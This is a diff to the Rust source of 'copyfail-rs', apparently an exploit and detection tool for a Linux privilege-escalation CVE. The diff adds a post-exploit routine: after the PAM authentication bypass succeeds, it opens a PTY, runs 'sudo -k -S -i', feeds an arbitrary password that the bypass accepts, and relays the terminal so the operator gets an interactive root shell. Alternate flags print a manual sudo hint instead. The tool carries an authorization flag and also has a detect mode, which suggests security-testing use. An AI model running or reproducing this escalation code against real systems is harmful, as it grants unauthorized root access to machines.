@@ -7,6 +7,7 @@ use copyfail_rs::detect::hunt::run_hunt;
 use copyfail_rs::detect::output::{check_human, check_json, diff_human, scan_human, scan_json, OUT_BUF};
 use copyfail_rs::detect::scan::{default_paths, run_scan};
 use copyfail_rs::detect::watch::run_watch;
+use copyfail_rs::post_exploit::{decide_post_action, PostAction, PAM_BYPASS_HINT};
 use copyfail_rs::vectors::{self, pam::PamVector};
 use copyfail_rs::{check_kernel, CopyFail, Error, Vector};
 use core::ffi::CStr;
@@ -27,13 +28,20 @@ const USAGE: &[u8] = b"copyfail-rs (CVE-2026-31431)\n\
 Usage:\n\
   copyfail --check\n\
   copyfail --mode exploit --vector <pam|su|passwd|auto> --i-have-authorization\n\
+                   [--no-shell] [--json]\n\
   copyfail --mode detect --check [--json]\n\
   copyfail --mode detect --scan [--json] [PATH ...]\n\
   copyfail --mode detect --baseline FILE [PATH ...]\n\
   copyfail --mode detect --diff FILE [--json]\n\
   copyfail --mode detect --watch [--interval SECS]\n\
   copyfail --mode detect --hunt --hosts FILE\n\
-  copyfail --help\n";
+  copyfail --help\n\
+\n\
+Exploit-mode flags (PAM only):\n\
+  Default (TTY, no --no-shell/--json): allocates a PTY and drops a root\n\
+              shell via `sudo -k -S -i` after the bypass is active.\n\
+  --no-shell  Suppress the auto-shell drop; print the manual sudo hint.\n\
+  --json      Emit machine-readable JSON status (also suppresses shell drop).\n";
 
 #[no_mangle]
 #[allow(clippy::not_unsafe_ptr_arg_deref)]
@@ -64,6 +72,7 @@ struct Args {
     detect_sub: DetectSub,
     json: bool,
     strict: bool,
+    no_shell: bool,
     interval_secs: u32,
     file_arg: *const u8,
     extra_paths: [*const u8; 32],
@@ -79,6 +88,7 @@ impl Args {
             detect_sub: DetectSub::None,
             json: false,
             strict: false,
+            no_shell: false,
             interval_secs: 60,
             file_arg: core::ptr::null(),
             extra_paths: [core::ptr::null(); 32],
@@ -154,6 +164,8 @@ impl Args {
                 a.json = true;
             } else if cstr_eq(arg, b"--strict\0") {
                 a.strict = true;
+            } else if cstr_eq(arg, b"--no-shell\0") {
+                a.no_shell = true;
             } else if matches!(a.cmd, Cmd::Detect)
                 && matches!(a.detect_sub, DetectSub::Scan | DetectSub::Baseline)
                 && a.extra_paths_len < a.extra_paths.len()
@@ -217,10 +229,10 @@ fn run_exploit(args: &Args) -> i32 {
         return 2;
     }
     match args.vector {
-        VectorChoice::Pam => run_vector_pam(),
+        VectorChoice::Pam => run_vector_pam(args),
         VectorChoice::Su => run_vector_named(b"su"),
         VectorChoice::Passwd => run_vector_named(b"passwd"),
-        VectorChoice::Auto => run_vector_auto(),
+        VectorChoice::Auto => run_vector_auto(args),
         VectorChoice::None => {
             write_stderr(b"--mode exploit requires --vector <pam|su|passwd|auto>\n");
             2
@@ -239,10 +251,10 @@ fn run_vector_named(name: &[u8]) -> i32 {
     run_vector(v)
 }
 
-fn run_vector_auto() -> i32 {
+fn run_vector_auto(args: &Args) -> i32 {
     let pam = PamVector::new();
     if matches!(pam.applicable(), Ok(true)) {
-        return run_vector_pam();
+        return run_vector_pam(args);
     }
     for name in &[&b"su"[..], &b"passwd"[..]] {
         if let Some(v) = vectors::select(name) {
@@ -289,7 +301,7 @@ fn run_vector(v: &dyn Vector) -> i32 {
     }
 }
 
-fn run_vector_pam() -> i32 {
+fn run_vector_pam(args: &Args) -> i32 {
     let v = PamVector::new();
     match v.applicable() {
         Ok(true) => {}
@@ -313,13 +325,228 @@ fn run_vector_pam() -> i32 {
 
     match v.execute(&mut prim) {
         Ok(()) => {
-            write_stderr(b"pam: mutation written; try `sudo -k && sudo -n -i whoami`\n");
-            0
+            // FIX 1+3: post-exploit dispatch.
+            let stdin_is_tty = unsafe { libc::isatty(0) } == 1;
+            match decide_post_action(args.json, args.no_shell, stdin_is_tty) {
+                PostAction::DropShell => drop_root_shell_via_sudo(),
+                PostAction::PrintHint => {
+                    write_stderr(b"pam: bypass active. To get a root shell: ");
+                    write_stderr(PAM_BYPASS_HINT);
+                    write_stderr(b"\n");
+                    0
+                }
+                PostAction::EmitJson => {
+                    write_stdout(b"{\"vector\":\"pam\",\"outcome\":\"success\",\"bypass_active\":true,\"hint\":\"");
+                    write_stdout(PAM_BYPASS_HINT);
+                    write_stdout(b"\"}\n");
+                    0
+                }
+            }
         }
         Err(e) => {
             write_stderr(b"pam: execute failed\n");
             err_code(e)
         }
+    }
+}
+
+// ----- PTY drop-into-root-shell (FIX 1) -----
+//
+// After PAM bypass, fork a child that exec's `sudo -k -S -i` on a controlling
+// PTY. The parent feeds "any\n" as the password (PAM bypass makes any string
+// authenticate) and relays bytes between the user's terminal and the child
+// shell until the shell exits.
+//
+// Why this dance and not just `system("sudo -i")`:
+//   - sudo opens /dev/tty for password reading by default; -S redirects to
+//     stdin, but only if stdin is a terminal-ish fd. A fresh PTY satisfies
+//     that and gives us a real controlling terminal for the resulting bash.
+//   - Without a PTY, bash prints "bash: cannot set terminal process group"
+//     and refuses job control. Operator wants Ctrl-C / Ctrl-Z / tab
+//     completion / etc. to work.
+//   - Without raw mode on parent's stdin, the kernel line-disciplines the
+//     operator's keystrokes (line buffering, local echo) — useless for an
+//     interactive shell.
+//
+// Known limitation (v1): if this process is killed by SIGTERM/SIGKILL/SIGQUIT
+// between cfmakeraw and tcsetattr(orig), the operator's terminal stays in
+// raw mode. Recovery: `stty sane`. Adding a SIGTERM handler that restores
+// termios requires a static-mut termios store which is awkward in this
+// no_std/panic=abort bin. Documented for the future-work list.
+fn drop_root_shell_via_sudo() -> i32 {
+    let mut orig_termios: libc::termios = unsafe { core::mem::zeroed() };
+    let saved = unsafe { libc::tcgetattr(0, &mut orig_termios) } == 0;
+
+    let master = unsafe {
+        libc::open(c"/dev/ptmx".as_ptr(), libc::O_RDWR | libc::O_NOCTTY)
+    };
+    if master < 0 {
+        write_stderr(b"pam: open(/dev/ptmx) failed\n");
+        return 1;
+    }
+    if unsafe { libc::grantpt(master) } != 0 || unsafe { libc::unlockpt(master) } != 0 {
+        unsafe { libc::close(master); }
+        write_stderr(b"pam: grantpt/unlockpt failed\n");
+        return 1;
+    }
+
+    let mut slave_name = [0u8; 128];
+    if unsafe {
+        libc::ptsname_r(
+            master,
+            slave_name.as_mut_ptr() as *mut _,
+            slave_name.len(),
+        )
+    } != 0
+    {
+        unsafe { libc::close(master); }
+        write_stderr(b"pam: ptsname_r failed\n");
+        return 1;
+    }
+
+    let pid = unsafe { libc::fork() };
+    if pid < 0 {
+        unsafe { libc::close(master); }
+        write_stderr(b"pam: fork failed\n");
+        return 1;
+    }
+
+    if pid == 0 {
+        // CHILD: detach, take controlling TTY on slave, exec sudo.
+        unsafe {
+            libc::close(master);
+            libc::setsid();
+            let slave = libc::open(slave_name.as_ptr() as *const _, libc::O_RDWR);
+            if slave < 0 {
+                libc::syscall(libc::SYS_exit_group, 1);
+                core::hint::unreachable_unchecked()
+            }
+            libc::ioctl(slave, libc::TIOCSCTTY, 0);
+            libc::dup2(slave, 0);
+            libc::dup2(slave, 1);
+            libc::dup2(slave, 2);
+            if slave > 2 {
+                libc::close(slave);
+            }
+            // Reviewer H3: close every other fd before exec so a parent that
+            // launched us with extra fds open doesn't leak them into sudo.
+            // close_range is Linux 5.9+ (target VM is 6.17). Errors ignored —
+            // worst case some fd 3+ is closed-on-exec already.
+            libc::syscall(libc::SYS_close_range, 3u32, !0u32, 0u32);
+            // sudo -k invalidates user's timestamp cache, -S reads pw from
+            // stdin, -i runs login shell. argv[0] = "sudo".
+            let path = b"/usr/bin/sudo\0";
+            let arg0 = b"sudo\0";
+            let arg1 = b"-k\0";
+            let arg2 = b"-S\0";
+            let arg3 = b"-i\0";
+            let argv: [*const u8; 5] = [
+                arg0.as_ptr(),
+                arg1.as_ptr(),
+                arg2.as_ptr(),
+                arg3.as_ptr(),
+                core::ptr::null(),
+            ];
+            libc::execv(path.as_ptr() as *const _, argv.as_ptr() as *const *const _);
+            libc::syscall(libc::SYS_exit_group, 127);
+            core::hint::unreachable_unchecked()
+        }
+    }
+
+    // PARENT: raw stdin, feed password, relay until child exits.
+    if saved {
+        let mut raw = orig_termios;
+        unsafe { libc::cfmakeraw(&mut raw); }
+        unsafe { libc::tcsetattr(0, libc::TCSANOW, &raw); }
+    }
+
+    // Feed "any\n" so sudo's PAM call has something to read; the bypass
+    // does the rest.
+    let pw = b"any\n";
+    unsafe { libc::write(master, pw.as_ptr() as *const _, pw.len()); }
+
+    let mut fds = [
+        libc::pollfd { fd: 0, events: libc::POLLIN, revents: 0 },
+        libc::pollfd { fd: master, events: libc::POLLIN, revents: 0 },
+    ];
+    let mut buf = [0u8; 4096];
+    'relay: loop {
+        let r = unsafe { libc::poll(fds.as_mut_ptr(), 2, -1) };
+        if r < 0 {
+            let e = unsafe { *libc::__errno_location() };
+            if e == libc::EINTR {
+                continue;
+            }
+            break;
+        }
+        // stdin -> master.
+        // Reviewer M2: handle POLLHUP without POLLIN so a closed-pipe stdin
+        // doesn't busy-loop the relay.
+        if fds[0].revents & (libc::POLLIN | libc::POLLHUP) != 0 {
+            let n = unsafe { libc::read(0, buf.as_mut_ptr() as *mut _, buf.len()) };
+            if n > 0 {
+                let mut off = 0usize;
+                while off < n as usize {
+                    let w = unsafe {
+                        libc::write(master, buf.as_ptr().add(off) as *const _, n as usize - off)
+                    };
+                    if w <= 0 { break 'relay; }
+                    off += w as usize;
+                }
+            } else {
+                // EOF or POLLHUP with no data: stop polling stdin, keep
+                // draining master until child exits.
+                fds[0].fd = -1;
+            }
+        }
+        // master -> stdout
+        if fds[1].revents & libc::POLLIN != 0 {
+            let n = unsafe { libc::read(master, buf.as_mut_ptr() as *mut _, buf.len()) };
+            if n > 0 {
+                let mut off = 0usize;
+                while off < n as usize {
+                    let w = unsafe {
+                        libc::write(1, buf.as_ptr().add(off) as *const _, n as usize - off)
+                    };
+                    if w <= 0 { break 'relay; }
+                    off += w as usize;
+                }
+            } else {
+                // child closed slave -> shell exited.
+                break;
+            }
+        }
+        if fds[1].revents & (libc::POLLHUP | libc::POLLERR) != 0 {
+            // Drain any final bytes, then exit. Reviewer H2: retry on short
+            // writes so a slow stdout doesn't lose the shell's exit message.
+            loop {
+                let n = unsafe { libc::read(master, buf.as_mut_ptr() as *mut _, buf.len()) };
+                if n <= 0 { break; }
+                let mut off = 0usize;
+                while off < n as usize {
+                    let w = unsafe {
+                        libc::write(1, buf.as_ptr().add(off) as *const _, n as usize - off)
+                    };
+                    if w <= 0 { break; }
+                    off += w as usize;
+                }
+            }
+            break;
+        }
+    }
+
+    let mut status: i32 = 0;
+    unsafe { libc::waitpid(pid, &mut status, 0); }
+
+    if saved {
+        unsafe { libc::tcsetattr(0, libc::TCSANOW, &orig_termios); }
+    }
+    unsafe { libc::close(master); }
+
+    if libc::WIFEXITED(status) {
+        libc::WEXITSTATUS(status)
+    } else {
+        1
     }
 }
 
